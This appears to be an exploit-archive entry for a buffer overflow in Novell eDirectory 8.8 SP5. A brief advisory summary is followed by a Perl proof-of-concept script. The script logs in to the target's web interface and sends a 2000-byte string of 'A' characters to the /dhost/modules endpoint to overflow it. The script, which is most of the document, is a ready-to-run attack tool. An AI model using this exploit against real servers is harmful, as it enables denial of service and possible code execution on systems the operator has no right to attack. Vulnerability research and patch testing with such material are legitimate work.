source: http://www.securityfocus.com/bid/37009/info

Novell eDirectory is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.

Attackers can exploit this issue to execute arbitrary code in the context of the affected application. Failed exploit attempts will likely cause denial-of-service conditions.

Novell eDirectory 8.8 SP5 is vulnerable; other versions may also be affected. 

#!usr\bin\perl
#Vulnerability has found by HACKATTACK

use WWW::Mechanize;

use LWP::Debug qw(+);

use HTTP::Cookies;

$address=$ARGV[0];


if(!$ARGV[0]){

        print "Usage:perl $0 address\n";
        
exit();
}



$login = "$address/_LOGIN_SERVER_";

$url = "$address/dhost/";

$module = "modules?I:";

$buffer = "A" x 2000;


$vuln = $module.$buffer;

#Edit the username and password.

          $user = "username";

          $pass = "password";

#Edit the username and password.

my $mechanize = WWW::Mechanize->new();


$mechanize->cookie_jar(HTTP::Cookies->new(file => "$cookie_file",autosave => 1));


$mechanize->timeout($url_timeout);

$res = $mechanize->request(HTTP::Request->new('GET', "$login"));


    $mechanize->submit_form(

                  form_name => "authenticator",

                  fields    => {

                     usr => $user,

                     pwd => $pass},

                     button => 'Login');

$response2 = $mechanize->get("$url$vuln");